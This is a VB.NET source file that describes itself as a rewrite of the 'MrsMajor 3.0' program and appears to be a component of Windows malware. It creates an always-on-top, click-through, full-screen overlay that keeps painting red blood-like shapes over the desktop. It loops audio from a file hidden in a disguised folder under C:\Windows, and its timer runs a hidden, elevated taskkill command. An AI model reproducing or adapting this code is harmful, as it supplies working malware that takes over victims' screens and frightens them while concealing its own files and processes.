' The original source code made by rootabx is available at: https://github.com/Gork3m/MrsMajor-3.0
' rewritten in VB.NET by Angel Castillo / Windows Vista

Imports System.IO
Imports System.Diagnostics
Imports System.Drawing
Imports System.Media
Imports System.Threading
Imports System.Windows.Forms

Public Class MainForm
    Dim dropdownxpos As Integer = 0
    Dim finishdrop As Integer = 0
    Dim kalinlik As Integer = 0
    Dim qdropdownxpos As Integer = 0
    Dim qfinishdrop As Integer = 0
    Dim qkalinlik As Integer = 0
    Dim maxx As Integer
    Public howmuch As Integer = 0
    Public maxy As Integer
    Public Declare Function GetDC Lib "User32.dll" (hwnd As IntPtr) As IntPtr
    Public Declare Sub ReleaseDC Lib "User32.dll" (hwnd As IntPtr, dc As IntPtr)
    Public Declare Function SetForegroundWindow Lib "User32.dll" (hWnd As IntPtr) As Boolean
    Dim pictrans As Double = 0.99
    Dim rnd As New Random()

    Sub tm()
        SetForegroundWindow(Me.Handle)
        Thread.Sleep(10)
    End Sub
    Private Sub sagaCiz()
        Dim g As Graphics = Me.CreateGraphics()
        Dim b As SolidBrush = New SolidBrush(Color.FromArgb(rnd.[Next](100, 255), Color.Red))
        Dim mysize As Integer = 0
        mysize = rnd.[Next](3, 15)
        Dim genpos As Integer = 0
        Dim ranint As Integer = rnd.[Next](0, 11)

        If ranint < 5 Then
            genpos = rnd.[Next](-5, 65)
        End If

        If ranint > 4 AndAlso ranint < 8 Then
            genpos = rnd.[Next](65, 120)
        End If

        If ranint = 8 OrElse ranint = 9 Then
            genpos = rnd.[Next](120, 250)
        End If

        If ranint = 10 Then
            genpos = rnd.[Next](250, 500)
        End If

        If rnd.[Next](0, 2) = 1 Then
            g.FillEllipse(b, New Rectangle(maxx - genpos, rnd.[Next](0, maxy - 50), mysize, rnd.[Next](3, 15)))
        Else
            g.FillRectangle(b, New Rectangle(maxx - genpos, rnd.[Next](0, maxy - 50), mysize, rnd.[Next](3, 15)))
        End If

        g.Dispose()
    End Sub
    Private Sub solaCiz()
        Dim g As Graphics = Me.CreateGraphics()
        Dim b As SolidBrush = New SolidBrush(Color.FromArgb(rnd.[Next](100, 255), Color.Red))
        Dim mysize As Integer = 0
        mysize = rnd.[Next](3, 15)
        Dim genpos As Integer = 0
        Dim ranint As Integer = rnd.[Next](0, 11)

        If ranint < 5 Then
            genpos = rnd.[Next](-5, 65)
        End If

        If ranint > 4 AndAlso ranint < 8 Then
            genpos = rnd.[Next](65, 120)
        End If

        If ranint = 8 OrElse ranint = 9 Then
            genpos = rnd.[Next](120, 250)
        End If

        If ranint = 10 Then
            genpos = rnd.[Next](250, 500)
        End If

        If rnd.[Next](0, 2) = 1 Then
            g.FillEllipse(b, New Rectangle(genpos, rnd.[Next](0, maxy - 50), mysize, rnd.[Next](3, 15)))
        Else
            g.FillRectangle(b, New Rectangle(genpos, rnd.[Next](0, maxy - 50), mysize, rnd.[Next](3, 15)))
        End If

        g.Dispose()
    End Sub
    Private Sub usteCiz()
        Dim g As Graphics = Me.CreateGraphics()
        Dim b As SolidBrush = New SolidBrush(Color.FromArgb(rnd.[Next](100, 255), Color.Red))
        Dim mysize As Integer = 0
        mysize = rnd.[Next](3, 15)
        Dim genpos As Integer = 0
        Dim ranint As Integer = rnd.[Next](0, 11)

        If ranint < 5 Then
            genpos = rnd.[Next](-5, 20)
        End If

        If ranint > 4 AndAlso ranint < 8 Then
            genpos = rnd.[Next](20, 40)
        End If

        If ranint = 8 OrElse ranint = 9 Then
            genpos = rnd.[Next](40, 60)
        End If

        If ranint = 10 Then
            genpos = rnd.[Next](60, 100)
        End If

        If rnd.[Next](0, 2) = 1 Then
            g.FillEllipse(b, New Rectangle(rnd.[Next](20, maxx - 20), genpos, mysize, rnd.[Next](3, 15)))
        Else
            g.FillRectangle(b, New Rectangle(rnd.[Next](20, maxx - 20), genpos, mysize, rnd.[Next](3, 15)))
        End If

        g.Dispose()
    End Sub
    Private Sub altaCiz()
        Dim g As Graphics = Me.CreateGraphics()
        Dim b As SolidBrush = New SolidBrush(Color.FromArgb(rnd.[Next](100, 255), Color.Red))
        Dim mysize As Integer = 0
        mysize = rnd.[Next](3, 15)
        Dim genpos As Integer = 0
        Dim ranint As Integer = rnd.[Next](0, 11)

        If ranint < 5 Then
            genpos = rnd.[Next](-5, 20)
        End If

        If ranint > 4 AndAlso ranint < 8 Then
            genpos = rnd.[Next](20, 40)
        End If

        If ranint = 8 OrElse ranint = 9 Then
            genpos = rnd.[Next](40, 60)
        End If

        If ranint = 10 Then
            genpos = rnd.[Next](60, 100)
        End If

        If rnd.[Next](0, 2) = 1 Then
            g.FillEllipse(b, New Rectangle(rnd.[Next](20, maxx - 20), maxy - genpos, mysize, rnd.[Next](3, 15)))
        Else
            g.FillRectangle(b, New Rectangle(rnd.[Next](20, maxx - 20), maxy - genpos, mysize, rnd.[Next](3, 15)))
        End If

        g.Dispose()
    End Sub
    Private Sub dropit()
        Dim startpos As Integer = dropdownxpos
        Dim bitir As Integer = finishdrop
        Dim kalinlikx As Integer = kalinlik

        For a As Integer = 0 To bitir - 1

            Try
                Dim g As Graphics = Me.CreateGraphics()
                Dim b As SolidBrush = New SolidBrush(Color.FromArgb(255, Color.Red))
                g.FillEllipse(b, New Rectangle(startpos, -20, kalinlik, a))
                g.Dispose()
                Thread.Sleep(2)
            Catch
            End Try
        Next
    End Sub
    Private Sub dropitX()
        Dim startpos As Integer = qdropdownxpos
        Dim bitir As Integer = qfinishdrop
        Dim kalinlikx As Integer = qkalinlik

        For a As Integer = 0 To bitir - 1
            Dim g As Graphics = Me.CreateGraphics()
            Dim b As SolidBrush = New SolidBrush(Color.FromArgb(255, Color.Red))
            g.FillEllipse(b, New Rectangle(startpos, -20, kalinlikx, a))
            Thread.Sleep(5)
        Next
    End Sub
    Private Sub verticalDropX()
        qdropdownxpos = rnd.Next(1, maxx - 5)
        qfinishdrop = rnd.Next(5, 15)
        qkalinlik = rnd.Next(30, 90)
        ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf dropitX))
    End Sub
    Private Sub verticalDrop()
        dropdownxpos = rnd.Next(1, maxx - 5)
        finishdrop = rnd.Next(5, maxy - 20)
        kalinlik = rnd.Next(5, 25)
        ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf dropit))
    End Sub
    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Dim wew As CreateParams = MyBase.CreateParams
            wew.ExStyle = MyBase.CreateParams.ExStyle Or &H20
            Return wew
        End Get
    End Property

    Private Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.BackColor = Drawing.Color.Maroon
        Me.TransparencyKey = Drawing.Color.Maroon
        Me.FormBorderStyle = FormBorderStyle.None
        Me.TopMost = True
        Me.WindowState = FormWindowState.Maximized
        maxx = Me.Size.Width
        maxy = Me.Size.Height + 20

        If howmuch = 3 Then
            howmuch = 4
            pictrans = 0.99
        End If
        If howmuch = 2 Then
            howmuch = 3
            pictrans = 0.85
            Me.Show()
        End If
        If howmuch = 1 Then
            howmuch = 2
            pictrans = 0.75
            Me.Show()
        End If
        If howmuch = 0 Then
            howmuch = 1
            pictrans = 0.6
            Me.Show()
            Try
                Dim sp As New SoundPlayer("C:\Windows\winbase_base_procid_none\secureloc0x65\mainbgtheme.wav")
                Dim ps As New pinksavage
                ps.Show()
                sp.PlayLooping()
            Catch
            End Try
            ' ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf tm))
            Timer2.Start()
        End If
        Me.Opacity = pictrans
        'Me.WindowState = FormWindowState.Minimized
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim k As Integer = rnd.[Next](0, 10)

        If k < 3 Then
            sagaCiz()
        End If

        If k > 2 AndAlso k < 5 Then
            solaCiz()
        End If

        If k = 5 OrElse k = 8 Then
            usteCiz()
        End If

        If k = 6 OrElse k = 7 Then
            altaCiz()
        End If

        If k = 9 Then
            verticalDrop()
            'MsgBox("vertical drop atildi")
            'Dim f As Integer = rnd.Next(0, 150)
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Me.TopMost = True
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Try
            Dim prcx As Process = New Process()
            prcx.StartInfo.FileName = "cmd.exe"
            prcx.StartInfo.Arguments = "/c taskkill /f /im tobi0a0c.exe"
            prcx.StartInfo.Verb = "runas"
            prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            prcx.Start()
        Catch
            Application.Exit()
        End Try
    End Sub
End Class
